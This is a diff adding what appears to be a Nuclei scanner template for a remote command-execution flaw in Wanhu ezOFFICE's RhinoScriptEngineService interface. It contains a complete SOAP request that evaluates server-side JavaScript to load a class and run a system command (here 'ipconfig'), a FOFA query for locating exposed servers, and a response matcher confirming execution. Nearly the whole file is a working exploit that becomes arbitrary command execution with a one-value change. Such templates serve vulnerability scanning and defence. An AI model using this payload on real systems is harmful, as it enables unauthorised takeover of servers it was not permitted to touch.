@@ -1,0 +1,63 @@
+id: wanhu_ezOffice_RhinoScriptEngineService_rce
+info:
+  name: wanhu_ezOffice_RhinoScriptEngineService_rce
+  author: Rep1ay
+  severity: critical
+  description: 万户OA RhinoScriptEngineService接口存在命令执行漏洞，此漏洞可能导致攻击者获取系统权限、执行任意命令，严重威胁系统的机密性和完整性。
+  metadata:
+    max-request: 1
+    fofa-query: app="万户网络-ezOFFICE"
+    verified: true
+  tags: rce,wanhu,hw
+variables:
+  cmd: "ipconfig"
+
+http:
+    - raw:
+        - |
+          POST //defaultroot/services/./././RhinoScriptEngineService HTTP/1.1
+          Host: {{Hostname}}
+          Accept-Encoding: gzip, deflate
+          Accept: */*
+          Accept-Language: en
+          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36
+          Connection: close
+          Content-Type: text/xml;charset=UTF-8
+          SOAPAction: '""'
+          Content-Length: 1196
+
+          <?xml version='1.0' encoding='UTF-8'?>
+                  <soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:jav="http://javascript.script.sun.com">
+                    <soapenv:Body>
+                      <eval xmlns="http://127.0.0.1:8080/services/scriptEngine">
+                        <arg0 xmlns="">
+                          <![CDATA[
+                          try {
+                          load("nashorn:Moziilla_compat.js");
+                          } catch (e) {
+                          }
+                          importPackage(Packages.java.io);
+                          importPackage(Packages.java.lang);
+                          importPackage(Packages.java.util);
+                          importPackage(Packages.java.net);
+
+                          new URLClassLoader([new File('../server').toURL()]).loadClass('Test12').getConstructor([Class.forName("java.lang.String")]).newInstance(["ipconfig"]).toString()
+
+                          ]]>
+                        </arg0>
+                        <arg1 xmlns="" xsi:type="urn:SimpleScriptContext" xmlns:urn="urn:beanservice">
+                        </arg1>
+                      </eval>
+                    </soapenv:Body>
+                  </soapenv:Envelope>
+
+      matchers-condition: and
+      matchers:
+        - type: word
+          words:
+            - Windows IP
+
+        - type: status
+          status:
+            - 200
+# digest: 4b0a00483046022100a5e00cf13effb77bfe0496023b42d682904ef3d295d3ddd2f6fc5219cb56f5d5022100bfc29a5fd6a95dcb091c7f940d17d0ec4c19750dab862732c6a5eb8e68e677ed:6b2dd5af372f02ed15a56faf8ad98cf9
